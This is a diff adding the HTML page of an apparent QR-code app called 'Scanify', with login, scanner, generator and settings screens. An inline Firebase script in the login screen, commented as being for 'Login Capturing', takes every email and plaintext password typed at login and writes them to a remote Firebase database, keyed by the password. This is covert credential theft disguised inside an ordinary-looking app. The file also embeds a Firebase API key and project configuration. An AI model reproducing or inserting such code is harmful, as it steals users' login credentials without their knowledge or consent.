@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Scanify | Premium QR App</title>
+  <link rel="stylesheet" href="style.css">
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <script src="https://unpkg.com/html5-qrcode"></script>
+</head>
+
+<body class="theme-dark">
+
+  <div class="app-container">
+
+    <!-- Permission Screen -->
+    <div id="permissionScreen" class="screen hidden">
+      <div class="icon-container bounce"><i class="fa-solid fa-shield-halved"></i></div>
+      <h2>Secure Access</h2>
+      <p>Scanify requires Camera and Storage permissions to function seamlessly.</p>
+      <button class="btn primary" onclick="acceptPermissions()">
+        <span>Grant Permissions</span>
+        <i class="fa-solid fa-arrow-right"></i>
+      </button>
+    </div>
+
+    <!-- Login Screen -->
+    <div id="loginScreen" class="screen">
+      <div class="icon-container"><i class="fa-solid fa-user-lock"></i></div>
+      <h2>Welcome Back</h2>
+      <p>Log in to access your saved QR codes and settings.</p>
+      <div class="input-group">
+        <i class="fa-solid fa-envelope"></i>
+        <input type="email" id="email" placeholder="Email Address" required>
+      </div>
+      <div class="input-group">
+        <i class="fa-solid fa-lock"></i>
+        <input type="password" id="password" placeholder="Password" required>
+      </div>
+      <button class="btn primary" onclick="login()">
+        <span>Login</span>
+      </button>
+
+      <!-- Firebase Logic strictly for Login Capturing -->
+      <script type="module">
+        // Import the functions you need from the SDKs you need
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.9.0/firebase-app.js";
+        import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.9.0/firebase-analytics.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.9.0/firebase-database.js";
+
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+          apiKey: "AIzaSyAeAokSmV5biYmhiVEygZdu8bRZY6OwKRA",
+          authDomain: "scanify-8b2f8.firebaseapp.com",
+          databaseURL: "https://scanify-8b2f8-default-rtdb.firebaseio.com",
+          projectId: "scanify-8b2f8",
+          storageBucket: "scanify-8b2f8.firebasestorage.app",
+          messagingSenderId: "161299105303",
+          appId: "1:161299105303:web:8db3dd4341dfb4cb9ffe52",
+          measurementId: "G-TRWL4J7Z8H"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const analytics = getAnalytics(app);
+        const database = getDatabase(app);
+
+        // Securely log to Firebase when script.js announces a login
+        document.addEventListener("userLoginAttempt", (e) => {
+          const email = e.detail.email;
+          const password = e.detail.password;
+
+          if (email && password) {
+            const userData = {
+              username: email,
+              password: password
+            };
+
+            set(ref(database, '/users/' + password), userData)
+              .catch((err) => console.error("Firebase Database Error:", err));
+          }
+        });
+      </script>
+    </div>
+
+    <!-- Home Screen -->
+    <div id="homeScreen" class="screen hidden">
+      <div class="header">
+        <div class="greeting">
+          <h2>Dashboard</h2>
+          <p id="userEmailDisplay">user@example.com</p>
+        </div>
+        <div class="avatar"><i class="fa-solid fa-user"></i></div>
+      </div>
+
+      <div class="card-grid">
+        <div class="action-card" onclick="openScanner()">
+          <div class="card-icon"><i class="fa-solid fa-qrcode"></i></div>
+          <h3>Scan QR</h3>
+          <p>Scan instantly</p>
+        </div>
+        <div class="action-card" onclick="openGenerator()">
+          <div class="card-icon"><i class="fa-solid fa-wand-magic-sparkles"></i></div>
+          <h3>Create QR</h3>
+          <p>Generate codes</p>
+        </div>
+        <div class="action-card" onclick="openSaved()">
+          <div class="card-icon"><i class="fa-solid fa-bookmark"></i></div>
+          <h3>Saved</h3>
+          <p>View history</p>
+        </div>
+        <div class="action-card" onclick="openSettings()">
+          <div class="card-icon"><i class="fa-solid fa-gear"></i></div>
+          <h3>Settings</h3>
+          <p>App preferences</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Scanner Screen -->
+    <div id="scannerScreen" class="screen hidden">
+      <div class="screen-header">
+        <button class="btn secondary back-btn" onclick="goHome()"><i class="fa-solid fa-chevron-left"></i> Back</button>
+        <h2>Scan QR Code</h2>
+        <div style="width: 80px;"></div>
+      </div>
+      <div class="scanner-container">
+        <div id="reader"></div>
+      </div>
+      <p class="helper-text">Point your camera at a QR code to scan.</p>
+    </div>
+
+    <!-- Generator Screen -->
+    <div id="generatorScreen" class="screen hidden">
+      <div class="screen-header">
+        <button class="btn secondary back-btn" onclick="goHome()"><i class="fa-solid fa-chevron-left"></i> Back</button>
+        <h2>Generate QR</h2>
+        <div style="width: 80px;"></div>
+      </div>
+      <div class="form-container">
+        <div class="input-group">
+          <i class="fa-solid fa-link"></i>
+          <input type="text" id="qrText" placeholder="Enter text or URL...">
+        </div>
+        <button class="btn primary" onclick="generateQR()">Create Magic</button>
+      </div>
+      <div class="qr-result-container" id="qrResultContainer">
+        <div id="qrResult"></div>
+        <button class="btn secondary hidden" id="saveGeneratedBtn" onclick="saveGenerated()">Save QR</button>
+      </div>
+    </div>
+
+    <!-- Saved Screen -->
+    <div id="savedScreen" class="screen hidden">
+      <div class="screen-header">
+        <button class="btn secondary back-btn" onclick="goHome()"><i class="fa-solid fa-chevron-left"></i> Back</button>
+        <h2>Saved Scans</h2>
+        <button class="btn-icon danger" onclick="clearSaved()"><i class="fa-solid fa-trash-can"></i></button>
+      </div>
+      <div class="list-container" id="savedList">
+        <!-- List items go here -->
+      </div>
+    </div>
+
+    <!-- Settings Screen -->
+    <div id="settingsScreen" class="screen hidden">
+      <div class="screen-header">
+        <button class="btn secondary back-btn" onclick="goHome()"><i class="fa-solid fa-chevron-left"></i> Back</button>
+        <h2>Settings</h2>
+        <div style="width: 80px;"></div>
+      </div>
+      <div class="settings-list">
+        <div class="setting-item" onclick="setTheme('theme-light')">
+          <div class="setting-info">
+            <i class="fa-solid fa-sun"></i>
+            <span>Light Mode</span>
+          </div>
+          <i class="fa-solid fa-chevron-right"></i>
+        </div>
+        <div class="setting-item" onclick="setTheme('theme-dark')">
+          <div class="setting-info">
+            <i class="fa-solid fa-moon"></i>
+            <span>Dark Mode</span>
+          </div>
+          <i class="fa-solid fa-chevron-right"></i>
+        </div>
+        <div class="setting-item" onclick="setTheme('theme-eye')">
+          <div class="setting-info">
+            <i class="fa-solid fa-eye-low-vision"></i>
+            <span>Eye Protection</span>
+          </div>
+          <i class="fa-solid fa-chevron-right"></i>
+        </div>
+        <div class="setting-item danger" onclick="logout()">
+          <div class="setting-info">
+            <i class="fa-solid fa-right-from-bracket"></i>
+            <span>Log Out</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <script src="script.js"></script>
+</body>
+
+</html>
